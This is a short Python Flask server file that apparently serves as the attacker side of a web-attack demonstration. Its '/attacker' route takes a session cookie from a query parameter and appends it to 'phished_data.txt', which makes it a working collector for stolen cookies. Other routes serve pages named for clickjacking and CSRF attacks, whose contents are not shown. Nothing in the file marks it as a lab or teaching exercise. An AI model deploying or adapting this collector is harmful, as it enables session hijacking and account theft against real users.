from flask import Flask, jsonify, render_template, request

app = Flask(__name__)

@app.route("/attacker", methods = ['GET'])
def attacker():
    session_cookie = request.args.get('cookie')
    file = open("phished_data.txt", "a")
    file.write(session_cookie)
    file.write("\n")
    file.close()

    return " "

@app.route("/")
def home():
    return render_template('homepage.html')
 
@app.route("/clickjacker")
def click_jacker():
    return render_template('clickJacking.html')

@app.route("/CSRF")
def csrf():
    return render_template('CSRF.html')
 